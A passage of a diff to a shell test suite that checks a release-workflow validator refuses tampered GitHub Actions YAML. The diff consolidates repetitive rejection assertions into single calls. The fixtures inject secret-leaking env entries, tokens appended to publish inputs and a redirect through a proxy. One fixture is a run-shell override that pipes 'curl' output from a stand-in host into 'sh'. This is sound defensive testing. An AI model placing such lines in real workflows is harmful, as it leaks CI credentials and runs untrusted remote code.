+  --pass "the release-shape check refuses a value leaving an expression string open across the next value" \
+  --fail "a value leaving an expression string open across the next value in the verify job was not refused for that reason" \
+  "a verify step env value with a value leaving an expression string open across the next value" verify_value_carried_expression
+expect_rejection --reason 'an expression in a mapping key' \
+  --pass "the release-shape check refuses an expression opened in a mapping key" \
+  --fail "an expression opened in a mapping key in the verify job was not refused for that reason" \
+  "a verify step env value with an expression opened in a mapping key" verify_expression_in_mapping_key
+expect_rejection --reason 'an expression inside a flow collection' \
+  --pass "the release-shape check refuses an expression inside a flow collection" \
+  --fail "an expression inside a flow collection in the verify job was not refused for that reason" \
+  "a verify step env value with an expression inside a flow collection" verify_expression_in_flow_collection
+expect_rejection --reason 'exposes a GitHub token at workflow scope (#1712)' \
+  --pass "the workflow-scope scan reads past a comment carrying an expression string" \
+  --fail "a workflow-scope token read after an expression-carrying comment was not refused by the scan" \
+  "a workflow-scope value after a comment carrying an expression string" workflow_scope_comment_carried_expression
 expect_release_mode_rejection release-artifact \
   "a build job env value between comments carrying an expression string" \
   build_comment_carried_expression \
   'build job references a secrets context'
-expect_rejection "a snapshot input between comments carrying an expression string" \
-  snapshot_comment_carried_expression
-sync_last_rejection
-grep -qF 'snapshot job is not the generated snapshot job (#784)' "$tmproot/run.out" \
-  && pass "the snapshot job pin rejects an input between comments carrying an expression string" \
-  || fail "a snapshot input between expression-carrying comments was not rejected by the pin: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a verify step whose dash-led quoted key opens an empty block scalar" \
-  verify_dash_quoted_key_block_header
-sync_last_rejection
-grep -qF 'the release-shape check cannot read: a backslash' "$tmproot/run.out" \
-  && pass "the scanner reads the keys after a dash-led quoted block scalar key as structure" \
-  || fail "an escape after a dash-led quoted block scalar key in the verify job was not refused as unreadable: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a verify step value whose block scalar header sits alone on its line" \
-  verify_block_header_on_own_line
-sync_last_rejection
-grep -qF 'a block scalar header with no key or sequence entry on its line' "$tmproot/run.out" \
-  && pass "the release-shape check refuses a block scalar header alone on its line" \
-  || fail "a block scalar header alone on its line in the verify job was not refused for that reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a verify step block scalar leaving an expression string open over closing braces" \
-  verify_open_string_ending_in_braces
-sync_last_rejection
-grep -qF 'an expression left open at the end of its scalar' "$tmproot/run.out" \
-  && pass "the release-shape check refuses an expression string left open over closing braces" \
-  || fail "an expression string left open over closing braces in the verify job was not refused for that reason: $(tail -2 "$tmproot/run.out")"
+expect_rejection --reason 'snapshot job is not the generated snapshot job (#784)' \
+  --pass "the snapshot job pin rejects an input between comments carrying an expression string" \
+  --fail "a snapshot input between expression-carrying comments was not rejected by the pin" \
+  "a snapshot input between comments carrying an expression string" snapshot_comment_carried_expression
+expect_rejection --reason 'the release-shape check cannot read: a backslash' \
+  --pass "the scanner reads the keys after a dash-led quoted block scalar key as structure" \
+  --fail "an escape after a dash-led quoted block scalar key in the verify job was not refused as unreadable" \
+  "a verify step whose dash-led quoted key opens an empty block scalar" verify_dash_quoted_key_block_header
+expect_rejection --reason 'a block scalar header with no key or sequence entry on its line' \
+  --pass "the release-shape check refuses a block scalar header alone on its line" \
+  --fail "a block scalar header alone on its line in the verify job was not refused for that reason" \
+  "a verify step value whose block scalar header sits alone on its line" verify_block_header_on_own_line
+expect_rejection --reason 'an expression left open at the end of its scalar' \
+  --pass "the release-shape check refuses an expression string left open over closing braces" \
+  --fail "an expression string left open over closing braces in the verify job was not refused for that reason" \
+  "a verify step block scalar leaving an expression string open over closing braces" verify_open_string_ending_in_braces
 # shellcheck disable=SC2016 # each entry is literal YAML for the fixture, never expanded
 {
-  expect_rejection 'a top-level "env" key before jobs reading a secret' \
-    add_top_level_entry before-jobs '"env":' '  LEAK: ${{ secrets.ORG_ADMIN_TOKEN }}'
-  sync_last_rejection
-  grep -qF 'declares workflow keys other than the generated' "$tmproot/run.out" \
-    && pass 'the release-shape check refuses a top-level "env" key before jobs' \
-    || fail "a top-level \"env\" key before jobs was not refused by the workflow key set: $(tail -2 "$tmproot/run.out")"
-  expect_rejection 'a top-level "env" key after jobs reading a secret' \
-    add_top_level_entry after-jobs '"env":' '  LEAK: ${{ secrets.ORG_ADMIN_TOKEN }}'
-  sync_last_rejection
-  grep -qF 'declares workflow keys other than the generated' "$tmproot/run.out" \
-    && pass 'the release-shape check refuses a top-level "env" key after jobs' \
-    || fail "a top-level \"env\" key after jobs was not refused by the workflow key set: $(tail -2 "$tmproot/run.out")"
-  expect_rejection "a top-level 'env' key before jobs reading a secret" \
-    add_top_level_entry before-jobs "'env':" '  LEAK: ${{ secrets.ORG_ADMIN_TOKEN }}'
-  sync_last_rejection
-  grep -qF 'declares workflow keys other than the generated' "$tmproot/run.out" \
-    && pass "the release-shape check refuses a top-level 'env' key before jobs" \
-    || fail "a top-level 'env' key before jobs was not refused by the workflow key set: $(tail -2 "$tmproot/run.out")"
-  expect_rejection "a top-level 'env' key after jobs reading a secret" \
-    add_top_level_entry after-jobs "'env':" '  LEAK: ${{ secrets.ORG_ADMIN_TOKEN }}'
-  sync_last_rejection
-  grep -qF 'declares workflow keys other than the generated' "$tmproot/run.out" \
-    && pass "the release-shape check refuses a top-level 'env' key after jobs" \
-    || fail "a top-level 'env' key after jobs was not refused by the workflow key set: $(tail -2 "$tmproot/run.out")"
-  expect_rejection 'a top-level spaced env key before jobs reading a secret' \
-    add_top_level_entry before-jobs 'env :' '  LEAK: ${{ secrets.ORG_ADMIN_TOKEN }}'
-  sync_last_rejection
-  grep -qF 'declares workflow keys other than the generated' "$tmproot/run.out" \
-    && pass 'the release-shape check refuses a top-level spaced env key before jobs' \
-    || fail "a top-level spaced env key before jobs was not refused by the workflow key set: $(tail -2 "$tmproot/run.out")"
-  expect_rejection 'a top-level spaced env key after jobs reading a secret' \
-    add_top_level_entry after-jobs 'env :' '  LEAK: ${{ secrets.ORG_ADMIN_TOKEN }}'
-  sync_last_rejection
-  grep -qF 'declares workflow keys other than the generated' "$tmproot/run.out" \
-    && pass 'the release-shape check refuses a top-level spaced env key after jobs' \
-    || fail "a top-level spaced env key after jobs was not refused by the workflow key set: $(tail -2 "$tmproot/run.out")"
-  expect_rejection 'a top-level "defaults" key after jobs overriding the run shell' \
-    add_top_level_entry after-jobs '"defaults":' '  run:' '    shell: bash -c "curl -sf https://example.invalid | sh; {0}"'
-  sync_last_rejection
-  grep -qF 'declares workflow keys other than the generated' "$tmproot/run.out" \
-    && pass 'the release-shape check refuses a top-level "defaults" key after jobs' \
-    || fail "a top-level \"defaults\" key after jobs was not refused by the workflow key set: $(tail -2 "$tmproot/run.out")"
+  expect_rejection --reason 'declares workflow keys other than the generated' \
+    --pass 'the release-shape check refuses a top-level "env" key before jobs' \
+    --fail "a top-level \"env\" key before jobs was not refused by the workflow key set" \
+    'a top-level "env" key before jobs reading a secret' add_top_level_entry before-jobs '"env":' '  LEAK: ${{ secrets.ORG_ADMIN_TOKEN }}'
+  expect_rejection --reason 'declares workflow keys other than the generated' \
+    --pass 'the release-shape check refuses a top-level "env" key after jobs' \
+    --fail "a top-level \"env\" key after jobs was not refused by the workflow key set" \
+    'a top-level "env" key after jobs reading a secret' add_top_level_entry after-jobs '"env":' '  LEAK: ${{ secrets.ORG_ADMIN_TOKEN }}'
+  expect_rejection --reason 'declares workflow keys other than the generated' \
+    --pass "the release-shape check refuses a top-level 'env' key before jobs" \
+    --fail "a top-level 'env' key before jobs was not refused by the workflow key set" \
+    "a top-level 'env' key before jobs reading a secret" add_top_level_entry before-jobs "'env':" '  LEAK: ${{ secrets.ORG_ADMIN_TOKEN }}'
+  expect_rejection --reason 'declares workflow keys other than the generated' \
+    --pass "the release-shape check refuses a top-level 'env' key after jobs" \
+    --fail "a top-level 'env' key after jobs was not refused by the workflow key set" \
+    "a top-level 'env' key after jobs reading a secret" add_top_level_entry after-jobs "'env':" '  LEAK: ${{ secrets.ORG_ADMIN_TOKEN }}'
+  expect_rejection --reason 'declares workflow keys other than the generated' \
+    --pass 'the release-shape check refuses a top-level spaced env key before jobs' \
+    --fail "a top-level spaced env key before jobs was not refused by the workflow key set" \
+    'a top-level spaced env key before jobs reading a secret' add_top_level_entry before-jobs 'env :' '  LEAK: ${{ secrets.ORG_ADMIN_TOKEN }}'
+  expect_rejection --reason 'declares workflow keys other than the generated' \
+    --pass 'the release-shape check refuses a top-level spaced env key after jobs' \
+    --fail "a top-level spaced env key after jobs was not refused by the workflow key set" \
+    'a top-level spaced env key after jobs reading a secret' add_top_level_entry after-jobs 'env :' '  LEAK: ${{ secrets.ORG_ADMIN_TOKEN }}'
+  expect_rejection --reason 'declares workflow keys other than the generated' \
+    --pass 'the release-shape check refuses a top-level "defaults" key after jobs' \
+    --fail "a top-level \"defaults\" key after jobs was not refused by the workflow key set" \
+    'a top-level "defaults" key after jobs overriding the run shell' add_top_level_entry after-jobs '"defaults":' '  run:' '    shell: bash -c "curl -sf https://example.invalid | sh; {0}"'
   # No context read and no variable on the credential-sensitive list: only the
   # key set sees a workflow environment that routes the credentialed
   # acquisition's registry traffic through a caller-chosen proxy.
-  expect_rejection 'a top-level "env" key after jobs setting a proxy' \
-    add_top_level_entry after-jobs '"env":' '  HTTPS_PROXY: http://proxy.example.invalid:8080'
-  sync_last_rejection
-  grep -qF 'declares workflow keys other than the generated' "$tmproot/run.out" \
-    && pass 'the release-shape check refuses a top-level "env" key setting a proxy' \
-    || fail "a top-level \"env\" key setting a proxy after jobs was not refused by the workflow key set: $(tail -2 "$tmproot/run.out")"
-  expect_rejection 'a generated run-name moved after jobs reading the token' move_run_name_after_jobs
-  sync_last_rejection
-  grep -qF 'exposes a GitHub token at workflow scope (#1712)' "$tmproot/run.out" \
-    && pass 'the workflow-scope scan reads a generated key moved after jobs' \
-    || fail "a token read in a run-name moved after jobs was not refused by the workflow-scope scan: $(tail -2 "$tmproot/run.out")"
-  expect_rejection 'a verify step bare if reading the token' verify_step_if \
-    "        if: steps.release-version.outputs.selected == 'true' || contains(github.TOKEN, 'x')"
-  sync_last_rejection
-  grep -qF 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' "$tmproot/run.out" \
-    && pass 'the verify-job context scan reads a bare if as an expression' \
-    || fail "a token read in a bare verify step if was not refused by the context scan: $(tail -2 "$tmproot/run.out")"
-  expect_rejection 'a verify step wrapped if reading the token' verify_step_if \
-    "        if: \${{ steps.release-version.outputs.selected == 'true' || contains(github.TOKEN, 'x') }}"
-  sync_last_rejection
-  grep -qF 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' "$tmproot/run.out" \
-    && pass 'the verify-job context scan reads a wrapped if' \
-    || fail "a token read in a wrapped verify step if was not refused by the context scan: $(tail -2 "$tmproot/run.out")"
-  expect_rejection 'a verify step double-quoted if reading the token' verify_step_if \
-    "        if: \"steps.release-version.outputs.selected == 'true' || contains(github.TOKEN, 'x')\""
-  sync_last_rejection
-  grep -qF 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' "$tmproot/run.out" \
-    && pass 'the verify-job context scan reads a double-quoted if as an expression' \
-    || fail "a token read in a double-quoted verify step if was not refused by the context scan: $(tail -2 "$tmproot/run.out")"
+  expect_rejection --reason 'declares workflow keys other than the generated' \
+    --pass 'the release-shape check refuses a top-level "env" key setting a proxy' \
+    --fail "a top-level \"env\" key setting a proxy after jobs was not refused by the workflow key set" \
+    'a top-level "env" key after jobs setting a proxy' add_top_level_entry after-jobs '"env":' '  HTTPS_PROXY: http://proxy.example.invalid:8080'
+  expect_rejection --reason 'exposes a GitHub token at workflow scope (#1712)' \
+    --pass 'the workflow-scope scan reads a generated key moved after jobs' \
+    --fail "a token read in a run-name moved after jobs was not refused by the workflow-scope scan" \
+    'a generated run-name moved after jobs reading the token' move_run_name_after_jobs
+  expect_rejection --reason 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' \
+    --pass 'the verify-job context scan reads a bare if as an expression' \
+    --fail "a token read in a bare verify step if was not refused by the context scan" \
+    'a verify step bare if reading the token' verify_step_if "        if: steps.release-version.outputs.selected == 'true' || contains(github.TOKEN, 'x')"
+  expect_rejection --reason 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' \
+    --pass 'the verify-job context scan reads a wrapped if' \
+    --fail "a token read in a wrapped verify step if was not refused by the context scan" \
+    'a verify step wrapped if reading the token' verify_step_if "        if: \${{ steps.release-version.outputs.selected == 'true' || contains(github.TOKEN, 'x') }}"
+  expect_rejection --reason 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' \
+    --pass 'the verify-job context scan reads a double-quoted if as an expression' \
+    --fail "a token read in a double-quoted verify step if was not refused by the context scan" \
+    'a verify step double-quoted if reading the token' verify_step_if "        if: \"steps.release-version.outputs.selected == 'true' || contains(github.TOKEN, 'x')\""
   # A single-quoted YAML value read as expression text would be one string
   # literal, so its delimiters are stripped before the scan.
-  expect_rejection 'a verify step single-quoted if reading the token' verify_step_if \
-    "        if: 'success() || contains(github.TOKEN, github.sha)'"
-  sync_last_rejection
-  grep -qF 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' "$tmproot/run.out" \
-    && pass 'the verify-job context scan reads a single-quoted if as an expression' \
-    || fail "a token read in a single-quoted verify step if was not refused by the context scan: $(tail -2 "$tmproot/run.out")"
+  expect_rejection --reason 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' \
+    --pass 'the verify-job context scan reads a single-quoted if as an expression' \
+    --fail "a token read in a single-quoted verify step if was not refused by the context scan" \
+    'a verify step single-quoted if reading the token' verify_step_if "        if: 'success() || contains(github.TOKEN, github.sha)'"
   # A tab after the colon separates the value as a space does.
-  expect_rejection 'a verify step if separated by a tab reading the token' verify_step_if \
-    "        if:"$'\t'"steps.release-version.outputs.selected == 'true' || contains(github.token, 'x')"
-  sync_last_rejection
-  grep -qF 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' "$tmproot/run.out" \
-    && pass 'the verify-job context scan reads an if separated by a tab' \
-    || fail "a token read in a tab-separated verify step if was not refused by the context scan: $(tail -2 "$tmproot/run.out")"
+  expect_rejection --reason 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' \
+    --pass 'the verify-job context scan reads an if separated by a tab' \
+    --fail "a token read in a tab-separated verify step if was not refused by the context scan" \
+    'a verify step if separated by a tab reading the token' verify_step_if "        if:"$'\t'"steps.release-version.outputs.selected == 'true' || contains(github.token, 'x')"
   # Fail closed on key case: any case variant of `if` is read as expression code.
-  expect_rejection 'a verify step uppercase IF reading the token' verify_step_if \
-    "        IF: steps.release-version.outputs.selected == 'true' || contains(github.token, 'x')"
-  sync_last_rejection
-  grep -qF 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' "$tmproot/run.out" \
-    && pass 'the verify-job context scan reads an uppercase IF as an expression' \
-    || fail "a token read in an uppercase verify step IF was not refused by the context scan: $(tail -2 "$tmproot/run.out")"
-  expect_rejection 'a verify step if continued onto the next line reading the token' verify_step_if \
-    "        if: steps.release-version.outputs.selected == 'true' ||" \
-    "          contains(github.TOKEN, 'x')"
-  sync_last_rejection
-  grep -qF 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' "$tmproot/run.out" \
-    && pass 'the verify-job context scan reads an if continued onto the next line' \
-    || fail "a token read on a continued verify step if line was not refused by the context scan: $(tail -2 "$tmproot/run.out")"
-  expect_rejection 'a publish prefix input with a secret appended' publish_with_input \
-    '      prefix: ${{ inputs.prefix }}' \
-    '      prefix: ${{ inputs.prefix }}${{ secrets.ORG_ADMIN_TOKEN }}'
-  sync_last_rejection
-  grep -qF 'publish job is not the generated publish job (ADR 0099)' "$tmproot/run.out" \
-    && pass 'the publish job pin refuses a secret appended to a generated input' \
-    || fail "a secret appended to the publish prefix input was not refused by the publish pin: $(tail -2 "$tmproot/run.out")"
-  expect_rejection 'a publish version input with the token appended' publish_with_input \
-    '      version: ${{ needs.verify.outputs.version }}' \
-    '      version: ${{ needs.verify.outputs.version }}${{ github.token }}'
-  sync_last_rejection
-  grep -qF 'publish job is not the generated publish job (ADR 0099)' "$tmproot/run.out" \
-    && pass 'the publish job pin refuses the token appended to a generated input' \
-    || fail "the token appended to the publish version input was not refused by the publish pin: $(tail -2 "$tmproot/run.out")"
+  expect_rejection --reason 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' \
+    --pass 'the verify-job context scan reads an uppercase IF as an expression' \
+    --fail "a token read in an uppercase verify step IF was not refused by the context scan" \
+    'a verify step uppercase IF reading the token' verify_step_if "        IF: steps.release-version.outputs.selected == 'true' || contains(github.token, 'x')"
+  expect_rejection --reason 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' \
+    --pass 'the verify-job context scan reads an if continued onto the next line' \
+    --fail "a token read on a continued verify step if line was not refused by the context scan" \
+    'a verify step if continued onto the next line reading the token' verify_step_if "        if: steps.release-version.outputs.selected == 'true' ||" "          contains(github.TOKEN, 'x')"
+  expect_rejection --reason 'publish job is not the generated publish job (ADR 0099)' \
+    --pass 'the publish job pin refuses a secret appended to a generated input' \
+    --fail "a secret appended to the publish prefix input was not refused by the publish pin" \
+    'a publish prefix input with a secret appended' publish_with_input '      prefix: ${{ inputs.prefix }}' '      prefix: ${{ inputs.prefix }}${{ secrets.ORG_ADMIN_TOKEN }}'
+  expect_rejection --reason 'publish job is not the generated publish job (ADR 0099)' \
+    --pass 'the publish job pin refuses the token appended to a generated input' \
+    --fail "the token appended to the publish version input was not refused by the publish pin" \
+    'a publish version input with the token appended' publish_with_input '      version: ${{ needs.verify.outputs.version }}' '      version: ${{ needs.verify.outputs.version }}${{ github.token }}'
 }
 publish_snapshot_version_token() {
   publish_with_input "$1" \
@@ -4987,31 +5069,26 @@ expect_release_mode_rejection release-artifact \
   "a release-artifact publish env value with the token appended" \
   publish_snapshot_version_token \
   'publish job is not the generated publish job (ADR 0099)'
-expect_rejection "a verify step env value with a doubled quote that moves where an expression ends" verify_escaped_single_quote_expression
-sync_last_rejection
-grep -qF 'the release-shape check cannot read' "$tmproot/run.out" \
-  && pass "the release-shape check refuses a doubled quote that moves where an expression ends" \
-  || fail "a doubled quote that moves where an expression ends in the verify job was not refused as unreadable: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a verify step env value with a line separator that splitlines() and YAML read differently" verify_line_separator_in_comment
-sync_last_rejection
-grep -qF 'the release-shape check cannot read' "$tmproot/run.out" \
-  && pass "the release-shape check refuses a line separator that splitlines() and YAML read differently" \
-  || fail "a line separator that splitlines() and YAML read differently in the verify job was not refused as unreadable: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a release caller with an extra job selecting the release environment" add_release_environment_job
-sync_last_rejection
-grep -qF 'declares jobs other than the generated' "$tmproot/run.out" \
-  && pass "the release caller job set refuses an extra job selecting the release environment" \
-  || fail "a release caller with an extra job selecting the release environment was not refused by the job set pin: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a release caller with an extra job reading a secret" add_secret_reading_job
-sync_last_rejection
-grep -qF 'declares jobs other than the generated' "$tmproot/run.out" \
-  && pass "the release caller job set refuses an extra job reading a secret" \
-  || fail "a release caller with an extra job reading a secret was not refused by the job set pin: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a release caller with a duplicate snapshot job key" duplicate_snapshot_job
-sync_last_rejection
-grep -qF 'declares a duplicate job or top-level key' "$tmproot/run.out" \
-  && pass "the release caller job set refuses a duplicate snapshot job key" \
-  || fail "a release caller with a duplicate snapshot job key was not refused by the job set pin: $(tail -2 "$tmproot/run.out")"
+expect_rejection --reason 'the release-shape check cannot read' \
+  --pass "the release-shape check refuses a doubled quote that moves where an expression ends" \
+  --fail "a doubled quote that moves where an expression ends in the verify job was not refused as unreadable" \
+  "a verify step env value with a doubled quote that moves where an expression ends" verify_escaped_single_quote_expression
+expect_rejection --reason 'the release-shape check cannot read' \
+  --pass "the release-shape check refuses a line separator that splitlines() and YAML read differently" \
+  --fail "a line separator that splitlines() and YAML read differently in the verify job was not refused as unreadable" \
+  "a verify step env value with a line separator that splitlines() and YAML read differently" verify_line_separator_in_comment
+expect_rejection --reason 'declares jobs other than the generated' \
+  --pass "the release caller job set refuses an extra job selecting the release environment" \
+  --fail "a release caller with an extra job selecting the release environment was not refused by the job set pin" \
+  "a release caller with an extra job selecting the release environment" add_release_environment_job
+expect_rejection --reason 'declares jobs other than the generated' \
+  --pass "the release caller job set refuses an extra job reading a secret" \
+  --fail "a release caller with an extra job reading a secret was not refused by the job set pin" \
+  "a release caller with an extra job reading a secret" add_secret_reading_job
+expect_rejection --reason 'declares a duplicate job or top-level key' \
+  --pass "the release caller job set refuses a duplicate snapshot job key" \
+  --fail "a release caller with a duplicate snapshot job key was not refused by the job set pin" \
+  "a release caller with a duplicate snapshot job key" duplicate_snapshot_job
 expect_release_mode_rejection release-artifact \
   "a publish job that selects the release environment" \
   publish_environment \
@@ -5021,234 +5098,180 @@ expect_release_mode_rejection release-artifact \
   build_matrix_dependency_index_changed \
   'build job is not the generated release-artifact build job (#975)'
 
-expect_rejection "a snapshot caller granting GITHUB_TOKEN contents-write (#784)" grant_snapshot_github_token_write
-expect_rejection "a snapshot job that verifies nothing first (#463, #464)" drop_snapshot_needs
-expect_rejection "a snapshot job with no explicit runner (#465)" drop_snapshot_runner
-expect_rejection "a resumed release that verifies the later dispatch tree instead of its tagged snapshot (#591)" drop_resume_snapshot_checkout
-expect_rejection "an npm ci installing with GITHUB_TOKEN (#465)" install_with_github_token
-expect_rejection "a verification job without package metadata preparation (#550)" drop_verify_prepare
-expect_rejection "a verification suite with no dispatched version stamp (#519)" drop_verify_stamp
-expect_rejection "version stamps that can run package lifecycle scripts (#519)" enable_stamp_lifecycle_scripts
-expect_rejection "a first release whose scaffold version already matches the dispatch (#579)" reject_same_version_stamp
-expect_rejection "a release verification suite receiving package credentials (#1712)" expose_private_token_to_verification_suite
-expect_rejection "a credentialed install step with an extra command (#1712)" append_credentialed_install_command
-sync_last_rejection
-grep -qF 'runs an unexpected credentialed acquisition command (#1712)' "$tmproot/run.out" \
-  && pass "the generated suite rejects extra commands beside credentialed npm ci" \
-  || fail "the generated suite rejected an extra credentialed command for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a credentialed install step without a repository npm configuration guard (#1717)" \
-  remove_credentialed_install_npmrc_guard
-sync_last_rejection
-grep -qF 'does not reject repository-controlled npm configuration before credentialed install (#1717)' \
-  "$tmproot/run.out" \
-  && pass "the generated suite requires a repository npm configuration guard before credentialed install" \
-  || fail "a missing credentialed npm configuration guard was rejected for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a credentialed install working-directory override (#1717)" \
-  add_install_working_directory
-sync_last_rejection
-grep -qF 'does not pin credentialed install step inputs and working directory (#1717)' \
-  "$tmproot/run.out" \
-  && pass "the generated suite pins the credentialed install working directory" \
-  || fail "a credentialed install working-directory override was rejected for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "canonical selection checkout uses an unpinned branch (#1717)" \
-  drift_canonical_selection_contract_checkout_ref
-sync_last_rejection
-grep -qF 'does not check out the canonical selection contract at its pinned ref (#1717)' \
-  "$tmproot/run.out" \
-  && pass "the generated suite binds its canonical checkout to the contract ref" \
-  || fail "a canonical selection checkout ref drift was rejected for another reason: $(tail -2 "$tmproot/run.out")"
+expect_rejection --reason "snapshot must grant only contents-read and environment-policy actions-read" "a snapshot caller granting GITHUB_TOKEN contents-write (#784)" grant_snapshot_github_token_write
+expect_rejection --reason "runs the irreversible snapshot with no needs:, so a red tree is discovered only after the" "a snapshot job that verifies nothing first (#463, #464)" drop_snapshot_needs
+expect_rejection --reason "passes no explicit runner:, so the snapshot and the publish half can land on different" "a snapshot job with no explicit runner (#465)" drop_snapshot_runner
+expect_rejection --reason "does not condition resumed verification on an existing snapshot" "a resumed release that verifies the later dispatch tree instead of its tagged snapshot (#591)" drop_resume_snapshot_checkout
+expect_rejection --reason "does not pass the private-dependency token to node-release.yml" "an npm ci installing with GITHUB_TOKEN (#465)" install_with_github_token
+# The guard must say why. A capture that aborts the suite under pipefail on no
+# match rejects the tree with no diagnostic at all (#1975).
+expect_rejection --reason "does not prepare package metadata before stamping and verifying the release tree (#550)" \
+  --pass "the missing metadata-preparation guard reports its own diagnostic (#1975)" \
+  --fail "a verification job without package metadata preparation was rejected without its diagnostic" \
+  "a verification job without package metadata preparation (#550)" drop_verify_prepare
+expect_rejection --reason "does not stamp the dispatched package version before the verification build or suite" "a verification suite with no dispatched version stamp (#519)" drop_verify_stamp
+expect_rejection --reason "does not stamp the dispatched package version before the verification build or suite" "version stamps that can run package lifecycle scripts (#519)" enable_stamp_lifecycle_scripts
+expect_rejection --reason "does not stamp the dispatched package version before the verification build or suite" "a first release whose scaffold version already matches the dispatch (#579)" reject_same_version_stamp
+expect_rejection --reason "exposes a GitHub or package secret beyond approved acquisition and restart-safe state" "a release verification suite receiving package credentials (#1712)" expose_private_token_to_verification_suite
+expect_rejection --reason 'runs an unexpected credentialed acquisition command (#1712)' \
+  --pass "the generated suite rejects extra commands beside credentialed npm ci" \
+  --fail "the generated suite rejected an extra credentialed command for another reason" \
+  "a credentialed install step with an extra command (#1712)" append_credentialed_install_command
+expect_rejection --reason 'does not reject repository-controlled npm configuration before credentialed install (#1717)' \
+  --pass "the generated suite requires a repository npm configuration guard before credentialed install" \
+  --fail "a missing credentialed npm configuration guard was rejected for another reason" \
+  "a credentialed install step without a repository npm configuration guard (#1717)" remove_credentialed_install_npmrc_guard
+expect_rejection --reason 'does not pin credentialed install step inputs and working directory (#1717)' \
+  --pass "the generated suite pins the credentialed install working directory" \
+  --fail "a credentialed install working-directory override was rejected for another reason" \
+  "a credentialed install working-directory override (#1717)" add_install_working_directory
+expect_rejection --reason 'does not check out the canonical selection contract at its pinned ref (#1717)' \
+  --pass "the generated suite binds its canonical checkout to the contract ref" \
+  --fail "a canonical selection checkout ref drift was rejected for another reason" \
+  "canonical selection checkout uses an unpinned branch (#1717)" drift_canonical_selection_contract_checkout_ref
 # ADR 0220 (2026-10-18): the credentialed step runs the contract's shared
 # acquisition script, so its checkout must be the pinned contract commit and
 # the tree must install from the acquisition cache with no credential.
-expect_rejection "a dependency acquisition contract checkout on an unpinned branch (#1712)" \
-  drift_acquisition_contract_checkout_ref
-sync_last_rejection
-grep -qF 'does not check out the dependency acquisition contract at its pinned ref (#1712)' \
-  "$tmproot/run.out" \
-  && pass "the generated suite binds the dependency acquisition checkout to the contract ref" \
-  || fail "an acquisition contract checkout ref drift was rejected for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a release verification job run inside a caller-chosen container (#1712)" \
-  add_verify_job_container
-sync_last_rejection
-grep -qF 'configures unapproved release verification job settings (#1712)' "$tmproot/run.out" \
-  && pass "the generated suite pins the release verification job settings" \
-  || fail "a verify job container was rejected for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a verify job without its reserved selection contract path refusal (#1712)" \
-  drop_verify_selection_path_guard
-sync_last_rejection
-grep -qF 'does not refuse a repository-controlled selection contract path (#1712)' \
-  "$tmproot/run.out" \
-  && pass "the generated suite requires the reserved selection contract path refusal" \
-  || fail "a missing selection-path refusal was rejected for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a verify job without its reserved acquisition contract path refusal (#1712)" \
-  drop_verify_contract_path_guard
-sync_last_rejection
-grep -qF 'does not refuse a repository-controlled dependency acquisition contract path (#1712)' \
-  "$tmproot/run.out" \
-  && pass "the generated suite requires the reserved acquisition contract path refusal" \
-  || fail "a missing reserved-path refusal was rejected for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a tokenless dependency install that bypasses the acquisition cache (#1712)" \
-  install_tokenless_tree_online
-sync_last_rejection
-grep -qF 'does not install the dependency tree from the acquisition cache without credentials (#1712)' \
-  "$tmproot/run.out" \
-  && pass "the generated suite requires the tokenless install to read the acquisition cache" \
-  || fail "an online tokenless install was rejected for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a package credential on the tree-building install (#1712)" \
-  credential_tokenless_install
-sync_last_rejection
-grep -qF 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' \
-  "$tmproot/run.out" \
-  && pass "the generated suite keeps the package credential off the tree-building install" \
-  || fail "a credentialed tree-building install was rejected for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "an escaped YAML explicit key setting inherited working-directory defaults (#1717)" \
-  add_escaped_defaults_explicit_key
-sync_last_rejection
-grep -qF 'uses unsupported explicit YAML mapping keys (#1717)' "$tmproot/run.out" \
-  && pass "the generated suite rejects explicit YAML mapping keys before environment checks" \
-  || fail "an escaped explicit defaults key was rejected for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a multiline escaped YAML explicit key setting inherited working-directory defaults (#1717)" \
-  add_multiline_escaped_defaults_explicit_key
-sync_last_rejection
-grep -qF 'uses unsupported explicit YAML mapping keys (#1717)' "$tmproot/run.out" \
-  && pass "the generated suite rejects multiline explicit YAML mapping keys" \
-  || fail "a multiline escaped explicit defaults key was rejected for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a verification job inheriting GITHUB_TOKEN (#1712)" expose_github_token_to_verify_job
-sync_last_rejection
-grep -qF 'exposes a GitHub or package secret beyond approved acquisition and restart-safe state steps (#1712)' "$tmproot/run.out" \
-  && pass "the generated suite rejects Git credentials inherited by release verification" \
-  || fail "the generated suite rejected an inherited Git token for another reason: $(tail -2 "$tmproot/run.out")"
